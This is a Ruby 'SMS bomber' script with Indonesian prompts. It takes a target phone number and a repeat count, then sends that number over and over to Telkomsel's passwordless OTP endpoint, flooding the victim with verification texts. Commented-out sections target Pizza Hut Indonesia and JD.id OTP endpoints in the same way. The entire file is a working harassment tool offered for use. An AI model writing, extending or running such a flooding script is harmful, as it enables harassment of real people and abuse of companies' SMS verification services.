require 'net/http'
require 'uri'

system("figlet SmsBomber")      

puts "---------------------------------------[ @zetc0de ]---------"


 print "Nomor Target : "
 target = gets.chomp
 print "Jumlah Bomb : "
 jumlah = gets.chomp.to_i

 puts

puts "On Progress..." 

for i in 1..jumlah
 puts "Bomb ke-#{i} Sukses Boss!"
 #telkomsel
 uri = URI.parse("https://tdwidm.telkomsel.com/passwordless/start")
 request = Net::HTTP::Post.new(uri)
 request.set_form_data(
   "connection" => "sms",
   "phone_number" => "#{target}",
 )
 
 req_options = {
   use_ssl: uri.scheme == "https",
 }
 
 response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
   http.request(request)
 end
 #phd
 #uri = URI.parse("https://www.phd.co.id/en/users/sendOTP")
 #request = Net::HTTP::Post.new(uri)
 #request.set_form_data(
 #  "phone_number" => "#{target}",
 #)
 # 
 #req_options = {
 #  use_ssl: uri.scheme == "https",
 #}
 # 
 #response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
 #  http.request(request)
 #end
 
 #jd
 #uri = URI.parse("http://sc.jd.id/phone/sendPhoneSms")
 #request = Net::HTTP::Post.new(uri)
 #request.set_form_data(
 #  "phone" => "#{target}",
 #  "smsType" => "1",
 #)
 # 
 # req_options = {
 #  use_ssl: uri.scheme == "https",
 #}
 #
 #response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
 #  http.request(request)
 #end


sleep(3)
end



# puts "1- Telkomsel"
# puts "2- Pizza Hut"
# puts "3- JD ID"
# print "Bomb menggunakan? (1-3) : "
# via = gets.chomp.to_id
#
# case via
# when 1
#  puts "Om Progress..."
#  puts
#  for i in 1..jumlah
#   target()
#   telkomsel(target) 
#   sleep(3)
#  end
# end
